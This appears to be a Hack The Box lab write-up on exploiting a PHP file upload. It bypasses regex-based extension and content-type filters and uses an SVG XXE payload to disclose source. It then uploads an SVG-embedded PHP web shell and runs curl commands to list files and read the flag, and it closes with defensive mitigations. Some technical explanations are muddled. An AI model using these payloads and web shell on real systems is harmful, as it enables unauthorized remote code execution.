# 🛰️ HTB Machine File Upload Vulnerability Assessment

## Overview

This assessment details a methodical attack on an HTTP file upload functionality in an HTB machine, focusing on bypassing validation mechanisms to achieve remote code execution and flag retrieval.

[!ABSTRACT] The process involves discovering valid extensions and content types, exploiting XXE (XML External Entity) injection, deploying a web shell, and executing commands to retrieve sensitive information. Specific techniques for each step are detailed, along with final steps to obtain the target flag.

---

## Reconnaissance

### Identifying Upload Functionality

The upload feature is identified through manual interaction on the HTB machine's contact page.

[!NOTE] The functionality allows users to submit feedback or files anonymously.

### Fuzzing Extensions and Content Types

Using Burp Suite, we fuzz the file upload with various extensions and content types to understand validation rules.

---

## Exploitation Details

### Discovering Allowed File Extensions

After testing multiple file extensions, it was found that `.svg` is accepted due to regex allowing 3-character extensions ending in 'g'.

[!WARNING] This bypasses the blacklist for `.ph(p|ps|tml)` extensions but gets whitelisted by `[a-z]{2,3}g$`.

### Identifying Allowed Content Types

The `Content-Type: image/svg+xml` header was discovered to be accepted.

[!INFO] This allows uploading SVG files which can contain executable PHP code when processed.

---

## Crafting the Exploit Payload

### XXE Injection for Source Code Disclosure

Create an `.svg` file containing a crafted XML payload with an external entity pointing to `php://filter/convert.base64-encode/resource=upload.php`.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

### Combined XXE+PHP Payload

Modify the SVG file to include PHP code for command execution wrapped in XML.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
<?php system($_REQUEST['cmd']); ?>
```

---

## Upload Process

### Frontend Bypass and Burp Request Modification

1. **Rename file:** `mv shell.phar.svg shell.phar.jpeg`
2. **Burp Intruder setup:**

```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.phar.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
<?php system($_REQUEST['cmd']); ?>
----boundary--
```

---

## Command Execution

### Calculating File Location

```bash
# Current date in ymd format (e.g., 221130 for Nov 30, 2022)
YMD=$(date +%y%m%d)
echo "Shell location: /contact/user_feedback_submissions/${YMD}_shell.phar.svg"
```

### Testing Command Execution

```bash
# List root directory
curl "http://TARGET_IP:PORT/contact/user_feedback_submissions/221130_shell.phar.svg?cmd=ls+/"
```

[!SUCCESS] The response will contain base64 encoded content from XXE and a list of files in the `/` directory.

### Retrieving the Flag

```bash
# Retrieve flag file contents
curl "http://TARGET_IP:PORT/contact/user_feedback_submissions/221130_shell.phar.svg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt"
```

---

## Attack Chain Summary

### Complete Methodology

**1. 🔍 Reconnaissance**
   - Identify upload functionality
   - Analyze upload behavior and responses

**2. 🎯 Extension Discovery**
   - Fuzz extensions with Burp Intruder
   - Identify bypasses (`.phar`, `.pht`, etc.)

**3. 📋 Content-Type Analysis**
   - Fuzz Content-Type headers
   - Discover allowed image types including `svg+xml`

**4. 📄 Source Code Disclosure**
   - Create XXE SVG payload
   - Extract `upload.php` source code
   - Analyze validation logic and file paths

**5. 💣 Web Shell Deployment**
   - Craft combined XXE+PHP payload
   - Bypass all validation layers
   - Upload executable web shell

**6. ⚡ Command Execution**
   - Calculate file location using date pattern
   - Execute system commands via URL parameter
   - Retrieve target flag file

---

## Technical Analysis

### Validation Bypass Techniques Used

**1. Extension Filtering Bypass:**

```php
// Blacklist regex: /.+\.ph(p|ps|tml)/
// Bypassed by: shell.phar.svg (doesn't end with blocked extensions)

// Whitelist regex: /^.+\.[a-z]{2,3}g$/  
// Satisfied by: .svg (3 chars ending in 'g')
```

**2. Content-Type Bypass:**

```php
// Type regex: /image\/[a-z]{2,3}g/
// Satisfied by: image/svg+xml (contains "svg" ending in 'g')
```

**3. File Execution Chain:**
- SVG uploaded → XML parser processes content → PHP code executed

### Vulnerability Root Causes

**1. Insufficient Extension Validation:** Regex allows 0day extensions
- `.svg` is whitelisted due to regex but contains executable code

**2. Weak Content-Type Validation:** 
- Allows `image/svg+xml`, enabling embedded scripts in SVG files

**3. Direct File Access:**
- Uploaded files accessible via direct URL with no execution restrictions 

**4. Predictable File Naming:**
- Date-based prefixes are easily calculated, revealing file locations without disclosure

---

## Defense Recommendations

### Immediate Mitigations

**1. Strict Extension Whitelist:**

```php
// Only allow specific safe image extensions
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
$extension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
if (!in_array($extension, $allowedExtensions)) {
    die("Extension not allowed");
}
```

**2. Enhanced Content Validation:**

```php
// Verify actual file content matches extension
$allowedTypes = [
    'jpg' => ['image/jpeg'],
    'jpeg' => ['image/jpeg'], 
    'png' => ['image/png'],
    'gif' => ['image/gif']
];

$actualType = mime_content_type($tmpFile);
if (!in_array($actualType, $allowedTypes[$extension])) {
    die("File content doesn't match extension");
}
```

**3. Execution Prevention:**

```apache
# .htaccess in upload directory
<Files "*">
    php_flag engine off
    AddType text/plain .php .phtml .php3 .svg
    RemoveHandler .php .phtml .php3 .php4 .php5 .svg
</Files>
```

**4. File Access Control:**

```php
// Serve files through controlled script instead of direct access
// Implement proper authorization and path validation
```

### Long-term Security Measures

1. **Content Sanitization**
2. **Isolated Processing Environment**
3. **Random File Names**
4. **WAF Protection**
5. **Regular Updates**

---

## Learning Outcomes

### Skills Demonstrated

**Technical Skills:**
- 🔍 Reconnaissance
- 🎯 Fuzzing
- 🛡️ Bypass Techniques
- 📄 XXE Exploitation
- 💣 Web Shell Deployment
- ⚡ Command Execution

**Methodology Skills:**
- Systematic Testing
- Chain Exploitation
- Pattern Recognition
- Tool Integration

### Key Takeaways

1. **Defense-in-Depth Failure:** Multiple weak controls don't equal strong security.
2. **Regex Complexity Risk:** Complex patterns often contain logical flaws.
3. **File Type Confusion:** SVG files blur the line between data and executable content.
4. **Information Disclosure Impact:** Source code access enables targeted attacks.
5. **Chained Vulnerabilities:** Individual weak controls compound into critical risk.

This assessment demonstrates how real-world file upload vulnerabilities require combining multiple techniques to achieve successful exploitation.